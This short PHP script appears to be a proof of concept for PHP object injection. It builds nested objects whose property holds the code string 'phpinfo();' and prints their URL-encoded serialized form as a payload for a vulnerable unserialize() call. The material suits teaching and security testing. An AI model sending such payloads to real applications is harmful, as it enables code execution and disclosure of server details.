<?php
class CodeSnippet
{
	 private $code = "phpinfo();";
}
class Example
{
	 private $obj;
	 function __construct()
	 {
		 $this->obj = new CodeSnippet;
	 }
}
print urlencode(serialize(new Example));